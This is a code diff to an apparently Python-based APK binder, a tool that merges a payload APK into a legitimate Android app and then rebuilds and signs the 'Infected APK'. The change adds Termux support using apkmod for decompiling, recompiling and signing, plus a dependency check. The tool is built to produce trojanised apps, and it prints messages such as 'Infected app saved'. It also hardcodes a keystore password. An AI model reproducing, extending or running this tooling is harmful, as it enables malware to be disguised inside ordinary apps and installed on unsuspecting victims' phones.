@@ -209,8 +209,8 @@ def Bind():
 		print (CYAN + "[+] Decompiling APKs...\n" + WHITE)
 		os.chdir("TempP/")
 		if Termux_Bool:
-			os.system('apktool d -f %s --force-manifest' % (original))
-			os.system('apktool d -f %s' % (payload))
+			os.system('apkmod -d %s %s' % (original,original.replace('.apk','')))
+			os.system('apkmod -d %s %s' % (payload,payload.replace('.apk','')))
 		else:
 			os.system('apktool d -f %s' % (original))
 			os.system('apktool d -f %s' % (payload))
@@ -292,12 +292,19 @@ def Bind():
 
 		print (CYAN + '[+] Compiling Infected APK...\n' + WHITE)
 
-		subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
-		subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
-		os.chdir('../')
+		if Termux_Bool:
+			subprocess.call("apkmod -r %s fin_out.apk" % (original.replace('.apk',''),shell=True))
+			os.chdir('../')
+		else:
+			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
+			subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
+			os.chdir('../')
 		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
 		if Termux_Bool:
-			subprocess.call("apksigner -p lmaolmfao release.keystore %s" % (str(sys.argv[3])),shell=True)
+			subprocess.call("apkmod -s TempP/fin_out.apk %s" % (str(sys.argv[3])))
+			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
+			subprocess.call(rm + " TempP",shell=True)
+			exit()
 		else:
 			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
 		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
@@ -330,6 +337,13 @@ def main():
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
 		os.system(rm + " ap.txt")
+	if Termux_Bool:
+		os.system("which apkmod>>apk.txt")
+		if os.path.getsize('apk.txt') == 0:
+			print(RED + "ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
+			exit()
+		else:
+			argscheck()
 	print("Checking whether APKSIGNER is installed or not...")
 	os.system(which + " apksigner>>aps.txt")
 	if os.path.getsize('aps.txt') == 0:
@@ -372,8 +386,6 @@ print("====================================================\n\n")
 sleep(1)
 
 # Finally:-
-if Termux_Bool:
-	print(RED + "WARNING: " + BLUE + "APKTool may not run properly on Termux\n\n" + WHITE)
 
 if not os.path.isfile("release.keystore"):
 	print(RED + "\nERROR: keystore file not found. EXITING..." + WHITE)
